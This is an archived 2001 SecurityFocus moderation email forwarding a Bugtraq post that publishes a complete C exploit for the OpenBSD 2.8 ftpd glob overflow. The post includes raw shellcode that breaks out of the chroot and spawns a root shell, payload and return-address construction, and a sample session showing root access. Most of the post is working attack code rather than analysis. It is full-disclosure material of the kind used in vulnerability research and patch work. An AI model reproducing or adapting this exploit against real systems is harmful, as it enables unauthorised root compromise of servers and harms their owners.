From aleph1@SECURITYFOCUS.COM Thu Apr 19 10:29:48 2001
Date: Mon, 16 Apr 2001 11:39:50 -0600
From: Elias Levy <aleph1@SECURITYFOCUS.COM>
To: vulq@securityfocus.com
Subject: (forw) BUGTRAQ: approval required (344AA3A4)


-- 
Elias Levy
SecurityFocus.com
http://www.securityfocus.com/
Si vis pacem, para bellum

    [ Part 2: "Included Message" ]

Date: Mon, 16 Apr 2001 07:47:33 -0600
From: "L-Soft list server at SecurityFocus.com (1.8d)"
    <LISTSERV@LISTS.SECURITYFOCUS.COM>
To: Elias Levy <aleph1@SECURITYFOCUS.COM>
Subject: BUGTRAQ: approval required (344AA3A4)

This message  was originally submitted  by stok@CODEFACTORY.SE to  the BUGTRAQ
list at LISTS.SECURITYFOCUS.COM. You can  approve it using the "OK" mechanism,
ignore it, or repost an edited copy. The message will expire automatically and
you do not need to do anything if you just want to discard it. Please refer to
the list owner's guide if you are  not familiar with the "OK" mechanism; these
instructions  are  being  kept  purposefully short  for  your  convenience  in
processing large numbers of messages.

----------------- Original message (ID=344AA3A4) (336 lines) ------------------
Return-Path: <owner-bugtraq@securityfocus.com>
Delivered-To: bugtraq@lists.securityfocus.com
Received: from securityfocus.com (mail.securityfocus.com [66.38.151.9])
	by lists.securityfocus.com (Postfix) with SMTP id C8D6A24C401
	for <bugtraq@lists.securityfocus.com>; Mon, 16 Apr 2001 07:47:32 -0600 (MDT)
Received: (qmail 4910 invoked by alias); 16 Apr 2001 13:47:34 -0000
Delivered-To: bugtraq@securityfocus.com
Received: (qmail 4907 invoked from network); 16 Apr 2001 13:47:33 -0000
Received: from skinner.codefactory.se (212.32.187.2)
  by mail.securityfocus.com with SMTP; 16 Apr 2001 13:47:33 -0000
Received: by skinner.codefactory.se (Postfix, from userid 511)
	id A444619073; Mon, 16 Apr 2001 15:50:50 +0200 (CEST)
Date: Mon, 16 Apr 2001 15:50:50 +0200
From: Tomas Kindahl <stok@codefactory.se>
To: bugtraq@securityfocus.com
Subject: OpenBSD 2.8 ftpd/glob exploit (breaks chroot)
Message-ID: <20010416155050.A2147@codefactory.se>
Mime-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
User-Agent: Mutt/1.2.5i

I thought I'd wait till after the weekend before posting this. Here goes:

/*
OpenBSD 2.x - 2.8 ftpd exploit.
  It is possible to exploit an anonymous ftp without write permission
  under certain circumstances. One is most likely to succeed if there
  is a single directory somewhere with more than 16 characters in its
  name.
  Of course, if one has write permissions, one could easily create
  such a directory.
  My return values aren't that good. Find your own.
  Patch is available at http://www.openbsd.org/errata.html
Example:
  ftp> pwd
  257 "/test" is current directory.
  ftp> dir
  229 Entering Extended Passive Mode (|||12574|)
  150 Opening ASCII mode data connection for '/bin/ls'.
  total 2
  drwxr-xr-x  2 1000  0  512 Apr 14 14:14 12345678901234567
  226 Transfer complete.
.....
  $ ./leheehel -c /test -l 17 -s0xdfbeb970 localhost
  // 230 Guest login ok, access restrictions apply.
  // 250 CWD command successful.
  retaddr = dfbeb970
  Press enter..
  remember to remove the "adfa"-dir
  id
  uid=0(root) gid=32766(nogroup) groups=32766(nogroup)
The shellcode basically does:
  seteuid(0); a = open("..", O_RDONLY); mkdir("adfa", 555);
  chroot("adfa"); fchdir(a); for(cnt = 100; cnt; cnt--)
    chdir("..");
  chroot(".."); execve("/bin//sh", ..);
Credits:
  COVERT for their advisory.
  The OpenBSD devteam for a great OS.
  beercan for letting me test this on his OpenBSD 2.8-RELEASE
Author:
  Tomas Kindahl <stok@codefactory.se>
  Stok@{irc,ef}net
*/

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

extern char *optarg;
static int debug;
int cflag, lflag, sflag;

/* The execve-part was stolen from "predator" */
char shellcode[] = 
"\x31\xc0\x50\x50\xb0\xb7\xcd\x80"
"\x58\x50\x66\x68\x2e\x2e\x89\xe1"
"\x50\x51\x50\xb0\x05\xcd\x80\x89"
"\xc3\x58\x50\x68\x61\x64\x66\x61"
"\x89\xe2\x66\x68\x6d\x01\x52\x50"
"\xb0\x88\xcd\x80\xb0\x3d\xcd\x80"
"\x53\x50\xb0\x01\x83\xc0\x0c\xcd"
"\x80\x51\x50\x31\xc9\xb1\x64\xb0"
"\x0c\xcd\x80\xe2\xfa\xb0\x3d\xcd"
"\x80\x31\xc0\x50\x68\x2f\x2f\x73"
"\x68\x68\x2f\x62\x69\x6e\x89\xe3"
"\x50\x53\x50\x54\x53\xb0\x3b\x50"
"\xcd\x80\xc3";

#define USER "USER ftp\r\n"
#define PASS "PASS -user@\r\n"

void usage(const char *);
void docmd(int s, const char *cmd, int print);
void communicate(int s);

int main(int argc, char *argv[])
{
  char expbuf[512] = "LIST ", *basedir, option;
  char commandbuf[512] = "", *hostname;
  int cnt, dirlen, explen, sendlen;
  int s, port = 21, pad;
  long retaddr;
  struct sockaddr_in sin;
  struct hostent *he;

  while((option = getopt(argc, argv, "dc:l:p:s:")) != -1)
    switch(option)
      {
      case 'd':
        debug++;
        break;
      case 'c':
        cflag = 1;
        basedir = optarg;
        break;
      case 'l':
        lflag = 1;
        dirlen = atoi(optarg);
        if(dirlen < 16)
          {
            usage(argv[0]);
            exit(0);
          }
        break;
      case 'p':
        port = atoi(optarg);
        break;
      case 's':
        sflag = 1;
        retaddr = strtoul(optarg, 0, 0);
        break;
      default:
        usage(argv[0]);
        exit(0);
      }

  if(!cflag || !lflag)
    {
      usage(argv[0]);
      exit(0);
    }

  if(argc - optind == 1)
    hostname = argv[optind];
  else
    {
      usage(argv[0]);
      exit(0);
    }

  if((s = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
      perror("socket");
      exit(1);
    }

  if((he = gethostbyname(hostname)) == NULL)
    {
      herror(hostname);
      exit(0);
    }
  memset(&sin, 0, sizeof(struct sockaddr_in));
  sin.sin_family = AF_INET;
  sin.sin_port = htons(port);
  memcpy(&sin.sin_addr, he->h_addr_list[0], sizeof(struct in_addr));
  if(connect(s, (struct sockaddr *) &sin, sizeof(struct sockaddr_in)) == -1)
    {
      perror("connect");
      exit(0);
    }

  if(debug)
    fprintf(stderr, "// basedir = \"%s\"\n", basedir);

  /* "untrusted input"? */
  for(cnt = 0; cnt < 1024/(dirlen+4)-1; cnt++)
    strcat(expbuf, "*/../");
  strcat(expbuf, "*/");
  if(debug)
    fprintf(stderr, "// expbuf = \"%s\"\n", expbuf);

  explen = cnt*(dirlen+4) + dirlen + 1;
  if(debug)
    fprintf(stderr, "// explen = %d\n", explen);

  sendlen = strlen(expbuf);
  if(debug)
    fprintf(stderr, "// sendlen = %d\n", sendlen);

  docmd(s, "", 0);

  docmd(s, USER, 0);
  docmd(s, PASS, 1);

  snprintf(commandbuf, sizeof(commandbuf), "CWD %s\r\n", basedir);
  docmd(s, commandbuf, 1);


/*************************/

  pad = 1027 - explen;
  if(debug)
    fprintf(stderr, "// pad = %d\n", pad);

  for(; pad >= 0; pad--)
    strcat(expbuf, "x");

  /* return address */
  if(!sflag)
    {
      switch(dirlen)
        {
        case 16:
          retaddr = 0xdfbeab60;
        case 26:
          retaddr = 0xdfbefe40;
        default:
          /* I don't have the patience to investigate this. */
          retaddr = 0xdfbeba20 + (dirlen-17)*0x9c0;
        }
      retaddr+=20;
    }

  fprintf(stderr, "retaddr = %.8lx\n", retaddr);
  /* endian dependant */
  strncat(expbuf, (char *) &retaddr, 4);

  for(cnt = strlen(expbuf); cnt < 508-strlen(shellcode); cnt++)
    strcat(expbuf, "\x90");

  strcat(expbuf, shellcode);

  strcat(expbuf, "\r\n");
/*************************/

  fprintf(stderr, "Press enter.."); fflush(stderr);
  fgets(commandbuf, sizeof(commandbuf)-1, stdin);

  docmd(s, expbuf, 0);

  fprintf(stderr, "remember to remove the \"adfa\"-dir\n");
  communicate(s);

  return 0;
}

void usage(const char *s)
{
  fprintf(stderr, "Usage %s [-s retaddr] [-d] -c dir -l dirlen(>=16) [-p port] hostname\n", s);
}

void docmd(int s, const char *cmd, int print)
{
  char uglybuf[1024];
  int len;
  fd_set rfds;
  struct timeval tv;

  len = strlen(cmd);
  if(debug)
    {
      write(STDERR_FILENO, "\\\\ ", 3);
      write(STDERR_FILENO, cmd, len);
    }
  if(send(s, cmd, len, 0) != len)
    {
      perror("send");
      exit(0);
    }

  FD_ZERO(&rfds);
  FD_SET(s, &rfds);
  tv.tv_sec = 1;
  tv.tv_usec = 0;
  select(s+1, &rfds, NULL, NULL, &tv);
  if(FD_ISSET(s, &rfds))
    {
      if((len = recv(s, uglybuf, sizeof(uglybuf), 0)) < 0)
        {
          perror("recv");
          exit(0);
        }
      if(len == 0)
        {
          fprintf(stderr, "EOF on socket. Sorry.\n");
          exit(0);
        }
      if(debug || print)
        {
          write(STDERR_FILENO, "// ", 3);
          write(STDERR_FILENO, uglybuf, len);
        }
    }
}

void communicate(int s)
{
  char buf[1024];
  int len;
  fd_set rfds;

  while(1)
    {
      FD_ZERO(&rfds);
      FD_SET(STDIN_FILENO, &rfds);
      FD_SET(s, &rfds);
      select(s+1, &rfds, NULL, NULL, NULL);
      if(FD_ISSET(STDIN_FILENO, &rfds))
        {
          if((len = read(STDIN_FILENO, buf, sizeof(buf))) <= 0)
            return;
          if(send(s, buf, len, 0) == -1)
            return;
        }
      if(FD_ISSET(s, &rfds))
        {
          if((len = recv(s, buf, sizeof(buf), 0)) <= 0)
            return;
          if(write(STDOUT_FILENO, buf, len) == -1)
            return;
        }
    }
}

-- 
Tomas Kindahl                    tomas.kindahl@codefactory.se
CodeFactory AB                   http://www.codefactory.se/
Office: +46 (0)90 71 86 13       Cell: +46 (0)73 922 92 30
